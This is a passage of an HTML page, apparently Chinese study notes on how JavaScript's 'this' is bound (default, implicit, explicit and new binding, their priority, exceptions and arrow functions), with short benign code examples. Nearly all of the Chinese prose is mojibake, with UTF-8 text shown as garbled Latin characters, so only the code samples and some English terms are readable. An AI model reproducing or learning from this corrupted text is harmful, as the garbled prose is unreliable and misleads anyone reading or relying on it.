<strong>é»˜è®¤ç»‘å®š</strong></h4><p><strong>ç‹¬ç«‹å‡½æ•°è°ƒç”¨</strong>:å¯¹å‡½æ•°ç›´æ¥ä½¿ç”¨è€Œä¸å¸¦ä»»ä½•ä¿®é¥°çš„å‡½æ•°å¼•ç”¨è¿›è¡Œè°ƒç”¨ã€‚ç®€å•ç‚¹ï¼Œä¸€ä¸ªå‡½æ•°ç›´æ¥æ˜¯<code>func()</code>è¿™æ ·è°ƒç”¨ï¼Œ<strong>å‰é¢ä»€ä¹ˆéƒ½æ²¡æœ‰</strong>ã€‚ä¸åŒäºé€šè¿‡å¯¹è±¡å±æ€§è°ƒç”¨ä¾‹å¦‚<code>obj.func()</code>ï¼Œä¹Ÿæ²¡æœ‰é€šè¿‡newå…³é”®å­—<code>new Function()</code>;ä¹Ÿæ²¡æœ‰é€šè¿‡applyï¼Œbindï¼Œcallå¼ºåˆ¶æ”¹å˜thisæŒ‡å‘ã€‚<br><strong>é»˜è®¤ç»‘å®š:</strong> å½“è¢«ç”¨ä½œç‹¬ç«‹å‡½æ•°è°ƒç”¨æ—¶ï¼ˆä¸è®ºè¿™ä¸ªå‡½æ•°åœ¨å“ªè¢«è°ƒç”¨ï¼Œä¸ç®¡å…¨å±€è¿˜æ˜¯å…¶ä»–å‡½æ•°å†…ï¼‰ï¼Œthisé»˜è®¤æŒ‡å‘åˆ°windowï¼›<br><strong>æ³¨æ„:</strong> å¦‚æœä½¿ç”¨ä¸¥æ ¼æ¨¡å¼(strict mode)ï¼Œé‚£ä¹ˆå…¨å±€å¯¹è±¡å°†æ— æ³•ä½¿ç”¨é»˜è®¤ç»‘å®šï¼Œå› æ­¤ this ä¼šç»‘å®šåˆ° undefined.</p><h4 id="2-2-2-éšå¼ç»‘å®š"><a href="#2-2-2-éšå¼ç»‘å®š" class="headerlink" title="2.2.2 éšå¼ç»‘å®š"></a>2.2.2 <strong>éšå¼ç»‘å®š</strong></h4><p><strong>éšå¼ç»‘å®š:</strong> å‡½æ•°è¢«æŸä¸ªå¯¹è±¡æ‹¥æœ‰æˆ–è€…åŒ…å«ï¼Œä¹Ÿå°±æ˜¯å‡½æ•°è¢«ä½œä¸ºå¯¹è±¡çš„å±æ€§æ‰€å¼•ç”¨ã€‚ä¾‹å¦‚<code>obj.func()</code>ï¼Œæ­¤æ—¶thisä¼šç»‘å®šåˆ°è¯¥å¯¹è±¡ä¸Šã€‚<br><strong>éšå¼ä¸¢å¤±:</strong> ä¸ç®¡æ˜¯é€šè¿‡å‡½æ•°åˆ«åæˆ–æ˜¯å°†å‡½æ•°ä½œä¸ºå…¥å‚é€ æˆçš„éšå¼ä¸¢å¤±ã€‚åªéœ€æ‰¾åˆ°å®ƒçœŸæ­£çš„è°ƒç”¨ä½ç½®ï¼Œå¹¶ä¸”å‡½æ•°å‰æ²¡æœ‰ä»»ä½•ä¿®é¥°ä¹Ÿæ²¡æœ‰æ˜¾å¼ç»‘å®š(éä¸¥æ ¼æ¨¡å¼ä¸‹)ï¼Œé‚£ä¹ˆthisåˆ™ä¼šè¿›è¡Œé»˜è®¤ç»‘å®šï¼ŒæŒ‡å‘windowã€‚    </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="built_in">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line"><span class="attr">a</span>: <span class="number">2</span>,</span><br><span class="line"><span class="attr">foo</span>: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = obj.foo; <span class="comment">// å‡½æ•°åˆ«åï¼</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;oops, global&quot;</span>; <span class="comment">// a æ˜¯å…¨å±€å¯¹è±¡çš„å±æ€§</span></span><br><span class="line">bar(); <span class="comment">// &quot;oops, global&quot;</span></span><br></pre></td></tr></table></figure><p>è™½ç„¶ bar æ˜¯ obj.foo çš„ä¸€ä¸ªå¼•ç”¨ï¼Œä½†æ˜¯å®é™…ä¸Šï¼Œå®ƒå¼•ç”¨çš„æ˜¯ foo å‡½æ•°æœ¬èº«ï¼Œå› æ­¤æ­¤æ—¶çš„ bar() å…¶å®æ˜¯ä¸€ä¸ªä¸å¸¦ä»»ä½•ä¿®é¥°çš„å‡½æ•°è°ƒç”¨ï¼Œå› æ­¤åº”ç”¨äº†é»˜è®¤ç»‘å®šã€‚</p><p>ä¼ å…¥å›è°ƒå‡½æ•°æ—¶:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="built_in">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doFoo</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line"><span class="comment">// fn å…¶å®å¼•ç”¨çš„æ˜¯ foo</span></span><br><span class="line">fn(); <span class="comment">// &lt;-- è°ƒç”¨ä½ç½®ï¼</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line"><span class="attr">a</span>: <span class="number">2</span>,</span><br><span class="line"><span class="attr">foo</span>: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;oops, global&quot;</span>; <span class="comment">// a æ˜¯å…¨å±€å¯¹è±¡çš„å±æ€§</span></span><br><span class="line">doFoo( obj.foo ); <span class="comment">// &quot;oops, global&quot;</span></span><br></pre></td></tr></table></figure><p>å‚æ•°ä¼ é€’å…¶å®å°±æ˜¯ä¸€ç§éšå¼èµ‹å€¼ï¼Œå› æ­¤æˆ‘ä»¬ä¼ å…¥å‡½æ•°æ—¶ä¹Ÿä¼šè¢«éšå¼èµ‹å€¼ã€‚</p><p><strong>æ³¨æ„:</strong> å®é™…å·¥ä½œä¸­ï¼Œå¤§éƒ¨åˆ†thisä½¿ç”¨é”™è¯¯éƒ½æ˜¯ç”±å¯¹éšå¼ä¸¢å¤±çš„ä¸ç†è§£é€ æˆçš„ã€‚<strong>è®°ä½å‡½æ•°è°ƒç”¨å‰æ²¡æœ‰ä»»ä½•ä¿®é¥°å’Œæ˜¾å¼ç»‘å®š(å…¶å®å°±æ˜¯callã€applyã€bind)ï¼Œthiså°±æŒ‡å‘window</strong>ã€‚</p><h4 id="2-2-3-æ˜¾å¼ç»‘å®š"><a href="#2-2-3-æ˜¾å¼ç»‘å®š" class="headerlink" title="2.2.3 æ˜¾å¼ç»‘å®š"></a>2.2.3 <strong>æ˜¾å¼ç»‘å®š</strong></h4><p>åœ¨åˆ†æéšå¼ç»‘å®šæ—¶ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ä¸€ä¸ªå¯¹è±¡å†…éƒ¨åŒ…å«ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„å±æ€§ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå±æ€§é—´æ¥å¼•ç”¨å‡½æ•°ï¼Œä»è€ŒæŠŠ this é—´æ¥(éšå¼)ç»‘å®šåˆ°è¿™ä¸ªå¯¹è±¡ä¸Šã€‚å¦‚æœæˆ‘ä»¬ä¸æƒ³åœ¨å¯¹è±¡å†…éƒ¨åŒ…å«å‡½æ•°å¼•ç”¨ï¼Œè€Œæƒ³åœ¨æŸä¸ªå¯¹è±¡ä¸Šå¼ºåˆ¶è°ƒç”¨å‡½æ•°ï¼Œæ­¤æ—¶åˆ™éœ€è¦æ˜¾å¼ç»‘å®šã€‚     </p><p><strong>æ˜¾å¼ç»‘å®š:</strong>  å¯ä»¥ç›´æ¥æŒ‡å®š this çš„ç»‘å®šå¯¹è±¡ï¼Œè¢«ç§°ä¹‹ä¸ºæ˜¾å¼ç»‘å®šã€‚åŸºæœ¬ä¸Šå°±æ˜¯æˆ‘ä»¬å¸¸ä½¿ç”¨çš„callã€applyã€bindæ–¹æ³•éƒ½æ˜¯æ˜¾å¼ç»‘å®šã€‚ </p><p>**æ³¨æ„:**å¦‚æœä½ ä¼ å…¥äº†ä¸€ä¸ªåŸå§‹å€¼(å­—ç¬¦ä¸²ç±»å‹ã€å¸ƒå°”ç±»å‹æˆ–è€…æ•°å­—ç±»å‹)æ¥å½“ä½œ this çš„ç»‘å®šå¯¹ è±¡ï¼Œè¿™ä¸ªåŸå§‹å€¼ä¼šè¢«è½¬æ¢æˆå®ƒçš„å¯¹è±¡å½¢å¼(ä¹Ÿå°±æ˜¯new String(..)ã€new Boolean(..)æˆ–è€… new Number(..))ã€‚è¿™é€šå¸¸è¢«ç§°ä¸ºâ€œè£…ç®±â€ã€‚</p><p><strong>ç¡¬ç»‘å®š:</strong> ä½¿ç”¨ callã€applyã€bind æ–¹æ³•å¼ºåˆ¶æ˜¾å¼åœ°å°† this è¿›è¡Œç»‘å®šï¼Œç§°ä¹‹ä¸ºç¡¬ç»‘å®šã€‚ç¡¬ç»‘å®šçš„å…¸å‹åº”ç”¨åœºæ™¯å°±æ˜¯åˆ›å»ºä¸€ä¸ªåŒ…è£¹å‡½æ•°(å…¶å®å°±æ˜¯å¸¸è¯´çš„å°è£…å‡½æ•°)ï¼Œä¼ å…¥æ‰€æœ‰çš„å‚æ•°å¹¶è¿”å›æ¥æ”¶åˆ°çš„æ‰€æœ‰å€¼ã€‚</p><p>åœ¨å°è£…å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¸¸ä½¿ç”¨applyï¼š</p><ul><li>ä¸€æ–¹é¢æ˜¯å› ä¸ºå®ƒå¯ä»¥æ‰‹åŠ¨ç»‘å®šthisï¼Œæ›´é‡è¦çš„æ˜¯å› ä¸ºå¯ä»¥ç”¨applyçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ–¹ä¾¿åœ°æ³¨å…¥æ‰€æœ‰ä¼ å…¥çš„å‚æ•°ã€‚ä¾‹å¦‚ä¹‹å‰æåˆ°çš„<code>modules[name]=impl.apply(implï¼Œdeps)</code>.å› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ä¼ å…¥çš„å‚æ•°æœ‰å¤šå°‘ä¸ªï¼Œä½†æˆ‘ä»¬å¯ä»¥æ–¹ä¾¿åœ°ä½¿ç”¨ä¸€ä¸ª<code>deps</code>å°†å…¶å…¨éƒ¨æ³¨å…¥ã€‚</li><li>å¦ä¸€ä¸ªå¸¸ç”¨çš„æ˜¯<code>foo.apply( nullï¼Œargue)</code>å½“æˆ‘ä»¬å°†applyçš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºnullæ—¶ï¼Œæ­¤æ—¶thiså°±ä¼šé»˜è®¤ç»‘å®šåˆ°windowã€‚åˆ‡è®°ä½¿ç”¨è¿™ç§ç”¨æ³•æ—¶<strong>ç¡®ä¿å‡½æ•°fooå†…æ²¡æœ‰ä½¿ç”¨thisï¼Œ</strong> å¦åˆ™å¾ˆå¯èƒ½ä¼šé€ æˆå…¨å±€æ±¡æŸ“ã€‚</li><li>è¿˜æœ‰ä¸€ç§å¸¸ç”¨å°±æ˜¯<code>foo.call(this)</code>ã€‚è¿™æ ·fooé‡Œçš„thiséƒ½ä¼šæŒ‡å‘å½“å‰è°ƒç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ.</li></ul><p><strong>APIè°ƒç”¨çš„â€œä¸Šä¸‹æ–‡â€:</strong> ç¬¬ä¸‰æ–¹åº“çš„è®¸å¤šå‡½æ•°ï¼Œä»¥åŠ JavaScript è¯­è¨€å’Œå®¿ä¸»ç¯å¢ƒä¸­è®¸å¤šæ–°çš„å†…ç½®å‡½æ•°ï¼Œéƒ½æä¾›äº†ä¸€ä¸ªå¯é€‰çš„å‚æ•°ï¼Œé€šå¸¸è¢«ç§°ä¸ºâ€œä¸Šä¸‹æ–‡â€(context)ï¼Œå…¶ä½œç”¨å’Œ bind(..) ä¸€æ ·ï¼Œç¡®ä¿ä½ çš„å›è°ƒå‡½æ•°ä½¿ç”¨æŒ‡å®šçš„ thisã€‚</p><h4 id="2-2-4-newç»‘å®š"><a href="#2-2-4-newç»‘å®š" class="headerlink" title="2.2.4 newç»‘å®š"></a><strong>2.2.4 newç»‘å®š</strong></h4><p>åœ¨ JavaScript ä¸­ï¼Œæ„é€ å‡½æ•°åªæ˜¯ä¸€äº›ä½¿ç”¨ new æ“ä½œç¬¦æ—¶è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œå®ƒä»¬å¹¶ä¸ä¼šå±äºæŸä¸ªç±»ï¼Œä¹Ÿä¸ä¼šå®ä¾‹åŒ–ä¸€ä¸ªç±»ã€‚å®é™…ä¸Šï¼Œ å®ƒä»¬ç”šè‡³éƒ½ä¸èƒ½è¯´æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ç±»å‹ï¼Œ<strong>å®ƒä»¬åªæ˜¯è¢« new æ“ä½œç¬¦è°ƒç”¨çš„æ™®é€šå‡½æ•°è€Œå·²ã€‚å®é™…ä¸Šå¹¶ä¸å­˜åœ¨æ‰€è°“çš„â€œæ„é€ å‡½æ•°â€ï¼Œåªæœ‰å¯¹äºå‡½æ•°çš„â€œæ„é€ è°ƒç”¨â€ã€‚</strong></p><p>ä½¿ç”¨ new æ¥è°ƒç”¨å‡½æ•°ï¼Œæˆ–è€…è¯´å‘ç”Ÿæ„é€ å‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œä¸‹é¢çš„æ“ä½œï¼š</p><ol><li>åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ã€‚</li><li>è¿™ä¸ªæ–°å¯¹è±¡ä¼šè¢«æ‰§è¡Œ[[åŸå‹]]è¿æ¥ã€‚</li><li>è¿™ä¸ªæ–°å¯¹è±¡ä¼šç»‘å®šåˆ°å‡½æ•°è°ƒç”¨çš„thisã€‚</li><li>å¦‚æœå‡½æ•°æ²¡æœ‰è¿”å›å…¶ä»–å¯¹è±¡ï¼Œé‚£ä¹ˆnewè¡¨è¾¾å¼ä¸­çš„å‡½æ•°è°ƒç”¨ä¼šè‡ªåŠ¨è¿”å›è¿™ä¸ªæ–°å¯¹è±¡ã€‚</li></ol><p>ç¤ºä¾‹:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123; </span><br><span class="line">  <span class="built_in">this</span>.a = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> foo(<span class="number">2</span>); </span><br><span class="line"><span class="built_in">console</span>.log( bar.a ); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ new æ¥è°ƒç”¨ foo(..) æ—¶ï¼Œæˆ‘ä»¬ä¼šæ„é€ ä¸€ä¸ªæ–°å¯¹è±¡å¹¶æŠŠå®ƒç»‘å®šåˆ° foo(..) è°ƒç”¨ä¸­çš„ this ä¸Šã€‚<br><strong>è¯´æ˜:å¯¹äºä¸Šé¢è¿™å¥è¯è¿›è¡Œè§£é‡Šä¸‹ï¼Œå¦‚æœåœ¨ä¸€ä¸ªå‡½æ•°å‰é¢å¸¦ä¸Š new å…³é”®å­—æ¥è°ƒç”¨ï¼Œ é‚£ä¹ˆèƒŒåœ°é‡Œå°†ä¼šåˆ›å»ºä¸€ä¸ªè¿æ¥åˆ°è¯¥å‡½æ•°çš„ prototype çš„æ–°å¯¹è±¡ï¼Œthiså°±æŒ‡å‘è¿™ä¸ªæ–°å¯¹è±¡ã€‚</strong></p><h3 id="2-3-ä¼˜å…ˆçº§"><a href="#2-3-ä¼˜å…ˆçº§" class="headerlink" title="2.3 ä¼˜å…ˆçº§"></a>2.3 ä¼˜å…ˆçº§</h3><p>ç»“è®º:     newç»‘å®š=æ˜¾ç¤ºç»‘å®š&gt;éšå¼ç»‘å®š&gt;é»˜è®¤ç»‘å®š     </p><p><strong>è¯´æ˜:</strong> newç»‘å®šä¸æ˜¾ç¤ºç»‘å®šæ˜¯ä¸èƒ½ç›´æ¥è¿›è¡Œæµ‹è¯•æ¯”è¾ƒï¼Œä½†é€šè¿‡åˆ†æå‘ç°newç»‘å®šå†…éƒ¨å…¶å®æ˜¯ä½¿ç”¨äº†ç¡¬ç»‘å®š(æ˜¾ç¤ºç»‘å®šçš„ä¸€ç§)ï¼Œæ‰€ä»¥newç»‘å®šå’Œæ˜¾ç¤ºç»‘å®šä¼˜å…ˆçº§åº”è¯¥å·®ä¸å¤šã€‚</p><p><strong>åˆ¤æ–­this:</strong>     ç°åœ¨æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¼˜å…ˆçº§æ¥åˆ¤æ–­å‡½æ•°åœ¨æŸä¸ªè°ƒç”¨ä½ç½®åº”ç”¨çš„æ˜¯å“ªæ¡è§„åˆ™ã€‚æŒ‰ä¸‹é¢çš„é¡ºåºè¿›è¡Œåˆ¤æ–­:</p><ol><li>å‡½æ•°æ˜¯å¦åœ¨newä¸­è°ƒç”¨(newç»‘å®š)ï¼Ÿå¦‚æœæ˜¯çš„è¯thisç»‘å®šçš„æ˜¯æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚  var bar = new foo()</li><li>å‡½æ•°æ˜¯å¦é€šè¿‡callã€apply(æ˜¾å¼ç»‘å®š)æˆ–è€…ç¡¬ç»‘å®šè°ƒç”¨ï¼Ÿå¦‚æœæ˜¯çš„è¯ï¼Œthisç»‘å®šçš„æ˜¯æŒ‡å®šçš„å¯¹è±¡ã€‚var bar = foo.call(obj2)</li><li>å‡½æ•°æ˜¯å¦åœ¨æŸä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ä¸­è°ƒç”¨(éšå¼ç»‘å®š)ï¼Ÿå¦‚æœæ˜¯çš„è¯ï¼Œthis ç»‘å®šçš„æ˜¯é‚£ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ã€‚var bar = obj1.foo()</li><li>å¦‚æœéƒ½ä¸æ˜¯çš„è¯ï¼Œä½¿ç”¨é»˜è®¤ç»‘å®šã€‚å¦‚æœåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œå°±ç»‘å®šåˆ°undefinedï¼Œå¦åˆ™ç»‘å®šåˆ°å…¨å±€å¯¹è±¡ã€‚var bar = foo()</li></ol><h3 id="2-4-ç»‘å®šä¾‹å¤–"><a href="#2-4-ç»‘å®šä¾‹å¤–" class="headerlink" title="2.4 ç»‘å®šä¾‹å¤–"></a>2.4 ç»‘å®šä¾‹å¤–</h3><h4 id="2-4-1-è¢«å¿½ç•¥çš„this"><a href="#2-4-1-è¢«å¿½ç•¥çš„this" class="headerlink" title="2.4.1 è¢«å¿½ç•¥çš„this"></a><strong>2.4.1 è¢«å¿½ç•¥çš„this</strong></h4><p>å¦‚æœä½ æŠŠ null æˆ–è€… undefined ä½œä¸º this çš„ç»‘å®šå¯¹è±¡ä¼ å…¥ callã€apply æˆ–è€… bindï¼Œè¿™äº›å€¼åœ¨è°ƒç”¨æ—¶ä¼šè¢«å¿½ç•¥ï¼Œå®é™…åº”ç”¨çš„æ˜¯é»˜è®¤ç»‘å®šè§„åˆ™ï¼Œthisä¼šç»‘å®šåˆ°windowä¸Šã€‚     </p><p><strong>ä½¿ç”¨æƒ…æ™¯:</strong>  ä½¿ç”¨ apply(..) æ¥â€œå±•å¼€â€ä¸€ä¸ªæ•°ç»„(ä¹Ÿå¯ä»¥ç”¨æ¥æ–¹ä¾¿åœ°å‚æ•°æ³¨å…¥)ï¼Œå¹¶å½“ä½œå‚æ•°ä¼ å…¥ä¸€ä¸ªå‡½æ•°ã€‚ç±»ä¼¼åœ°ï¼Œbind(..) å¯ä»¥å¯¹å‚æ•°è¿›è¡ŒæŸ¯é‡ŒåŒ–(é¢„å…ˆè®¾ç½®ä¸€äº›å‚æ•°)ï¼Œé€šè¿‡è‡ªå¸¦bindæ–¹æ³•å®ç°æŸ¯é‡ŒåŒ–æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚</p><p><strong>æ³¨æ„:</strong> </p><ul><li>åœ¨ ES6 ä¸­ï¼Œå¯ä»¥ç”¨ â€¦ æ“ä½œç¬¦ä»£æ›¿ apply(..) æ¥â€œå±• å¼€â€æ•°ç»„ï¼Œfoo(â€¦[1ï¼Œ2]) å’Œ foo(1ï¼Œ2)æ˜¯ä¸€æ ·çš„ï¼Œè¿™æ ·å¯ä»¥é¿å…ä¸å¿…è¦çš„ this ç»‘å®šã€‚</li><li>å½“ä½¿ç”¨nullæˆ–è€…undefinedè¿›è¡Œç»‘å®šæ—¶ï¼Œè¦<strong>ç¡®ä¿è¯¥å‡½æ•°å†…æ²¡æœ‰ä½¿ç”¨this</strong>ï¼Œå¦åˆ™æ­¤æ—¶å¾ˆå®¹æ˜“å¯¹å…¨å±€å˜é‡é€ æˆç ´åï¼</li></ul><p><strong>æ›´å®‰å…¨çš„thisï¼š</strong>å¦‚æœå‡½æ•°å†…ä½¿ç”¨äº†thisï¼Œç›´æ¥ä½¿ç”¨nullåˆ™å¯èƒ½ä¼šå¯¹å…¨å±€é€ æˆç ´åï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªâ€œDMZâ€(demilitarized zoneï¼Œéå†›äº‹åŒº)å¯¹è±¡â€”â€”å®ƒå°±æ˜¯ä¸€ä¸ªç©ºçš„éå§”æ‰˜çš„å¯¹è±¡(å§”æ‰˜åœ¨ç¬¬ 5 ç« å’Œç¬¬ 6 ç« ä»‹ç»)ã€‚è®©thisç»‘å®šåˆ°è¿™ä¸ªâ€DMZä¸Šï¼Œè¿™æ ·å°±ä¸ä¼šå¯¹å…¨å±€é€ æˆç ´åã€‚</p><p>æ€ä¹ˆåˆ›å»ºDMZå‘¢ï¼Ÿå°±æ˜¯é€šè¿‡<strong>Object.create(null)</strong> åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚è¿™ç§æ–¹æ³•å’Œ {} å¾ˆåƒï¼Œä½†æ˜¯å¹¶ä¸ä¼šåˆ›å»º Object.prototype è¿™ä¸ªå§”æ‰˜ï¼Œæ‰€ä»¥å®ƒæ¯” {}â€œæ›´ç©ºâ€æ›´åŠ å®‰å…¨ã€‚ ï¼ˆæ„Ÿè§‰ç”¨ä¸ä¸Šï¼‰</p><h4 id="2-4-2-é—´æ¥å¼•ç”¨"><a href="#2-4-2-é—´æ¥å¼•ç”¨" class="headerlink" title="2.4.2 é—´æ¥å¼•ç”¨"></a><strong>2.4.2 é—´æ¥å¼•ç”¨</strong></h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="built_in">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> o = &#123; <span class="attr">a</span>: <span class="number">3</span>ï¼Œ foo: foo &#125;; </span><br><span class="line"><span class="keyword">var</span> p = &#123; <span class="attr">a</span>: <span class="number">4</span> &#125;;</span><br><span class="line">o.foo(); <span class="comment">// 3</span></span><br><span class="line">(p.foo = o.foo)(); <span class="comment">// 2  å…¶å®å°±æ˜¯foo()  æ­¤æ—¶thisé»˜è®¤ç»‘å®šåˆ°window</span></span><br></pre></td></tr></table></figure><p>ä¾‹å­ä¸­çš„é—´æ¥å¼•ç”¨å…¶å®æ˜¯å¯¹å‡½æ•°çš„ç†è§£ä¸æ·±é€ æˆçš„ã€‚å…¶å®(p.foo = o.foo)()å°±æ˜¯(foo)()ï¼Œè¿™æ ·å°±æ˜¯å…¨å±€è°ƒç”¨foo()ï¼Œæ‰€ä»¥thisé»˜è®¤å°±ç»‘å®šåˆ°äº†windowä¸Šã€‚    </p><p><strong>æ³¨æ„:</strong>    å¯¹äºé»˜è®¤ç»‘å®šæ¥è¯´ï¼Œå†³å®š this ç»‘å®šå¯¹è±¡çš„å¹¶ä¸æ˜¯è°ƒç”¨ä½ç½®æ˜¯å¦å¤„äºä¸¥æ ¼æ¨¡å¼ï¼Œè€Œæ˜¯å‡½æ•°ä½“æ˜¯å¦å¤„äºä¸¥æ ¼æ¨¡å¼ã€‚å¦‚æœå‡½æ•°ä½“å¤„äºä¸¥æ ¼æ¨¡å¼ï¼Œthis ä¼šè¢«ç»‘å®šåˆ° undefinedï¼Œå¦åˆ™ this ä¼šè¢«ç»‘å®šåˆ°å…¨å±€å¯¹è±¡ã€‚</p><h4 id="2-4-3-è½¯ç»‘å®š"><a href="#2-4-3-è½¯ç»‘å®š" class="headerlink" title="2.4.3 è½¯ç»‘å®š"></a><strong>2.4.3 è½¯ç»‘å®š</strong></h4><p>ç¡¬ç»‘å®šä¼šå¤§å¤§é™ä½å‡½æ•°çš„çµæ´»æ€§ï¼Œä½¿ç”¨ç¡¬ç»‘å®šä¹‹åå°±æ— æ³•ä½¿ç”¨éšå¼ç»‘å®šæˆ–è€…æ˜¾å¼ç»‘å®šæ¥ä¿®æ”¹ thisã€‚è¿™æ—¶å€™åˆ™éœ€è¦ä½¿ç”¨è½¯ç»‘å®šã€‚    ï¼ˆPSï¼šæœ‰æ—¶é—´å¥½å¥½å­¦ä¸€ä¸‹ï¼‰</p><h3 id="2-5-thisè¯æ³•"><a href="#2-5-thisè¯æ³•" class="headerlink" title="2.5 thisè¯æ³•"></a>2.5 thisè¯æ³•</h3><p> ES6 ä¸­ä»‹ç»äº†ä¸€ç§æ— æ³•ä½¿ç”¨ä¸Šé¢å››æ¡è§„åˆ™çš„ç‰¹æ®Šå‡½æ•°ç±»å‹:ç®­å¤´å‡½æ•°ã€‚<strong>ç®­å¤´å‡½æ•°ä¸ä½¿ç”¨ this çš„å››ç§æ ‡å‡†è§„åˆ™ï¼Œè€Œæ˜¯æ ¹æ®å¤–å±‚(å‡½æ•°æˆ–è€…å…¨å±€)ä½œç”¨åŸŸæ¥å†³å®š thisã€‚</strong></p><p> <strong>é‡è¦:</strong></p><ul><li>ç®­å¤´å‡½æ•°æœ€å¸¸ç”¨äºå›è°ƒå‡½æ•°ä¸­ï¼Œä¾‹å¦‚äº‹ä»¶å¤„ç†å™¨æˆ–è€…å®šæ—¶å™¨.</li><li>ç®­å¤´å‡½æ•°å¯ä»¥åƒ bind(..) ä¸€æ ·ç¡®ä¿å‡½æ•°çš„ this è¢«ç»‘å®šåˆ°æŒ‡å®šå¯¹è±¡</li><li>ç®­å¤´å‡½æ•°ç”¨æ›´å¸¸è§çš„è¯æ³•ä½œç”¨åŸŸå–ä»£äº†ä¼ ç»Ÿçš„ this æœºåˆ¶ã€‚</li></ul><p><strong>æ³¨æ„</strong>è¿™ç§æƒ…å†µ:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">module</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="number">99</span>ï¼Œ</span><br><span class="line">  <span class="attr">bar</span>: <span class="built_in">module</span>.bind(<span class="built_in">this</span>) <span class="comment">//æ­¤æ—¶bindç»‘å®šçš„thisä¸ºwindow.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;window&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar()) <span class="comment">//window</span></span><br></pre></td></tr></table></figure><p>åœ¨ ES6 ä¹‹å‰æˆ‘ä»¬å°±å·²ç»åœ¨ä½¿ç”¨ä¸€ç§å‡ ä¹å’Œç®­å¤´å‡½æ•°å®Œå…¨ä¸€æ ·çš„æ¨¡å¼:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> self = <span class="built_in">this</span>; </span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log( self.a );</span><br><span class="line">    &#125;ï¼Œ <span class="number">100</span> );</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; </span><br><span class="line">    <span class="attr">a</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line">foo.call( obj ); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>è™½ç„¶ self = this å’Œç®­å¤´å‡½æ•°çœ‹èµ·æ¥éƒ½å¯ä»¥å–ä»£ bind(..)ï¼Œä½†æ˜¯ä»æœ¬è´¨ä¸Šæ¥è¯´ï¼Œå®ƒä»¬æƒ³æ›¿ä»£çš„æ˜¯ this æœºåˆ¶ã€‚</p><p><strong>å…³äºthisçš„ç¼–ç è§„èŒƒå»ºè®®:</strong></p><ul><li>åªä½¿ç”¨è¯æ³•ä½œç”¨åŸŸå¹¶å®Œå…¨æŠ›å¼ƒé”™è¯¯thisé£æ ¼çš„ä»£ç ã€‚</li><li>å®Œå…¨é‡‡ç”¨ this é£æ ¼ï¼Œåœ¨å¿…è¦æ—¶ä½¿ç”¨ bind(..)ï¼Œå°½é‡é¿å…ä½¿ç”¨ self = this å’Œç®­å¤´å‡½æ•°ã€‚</li></ul><h3 id="2-6-å°ç»“"><a href="#2-6-å°ç»“" class="headerlink" 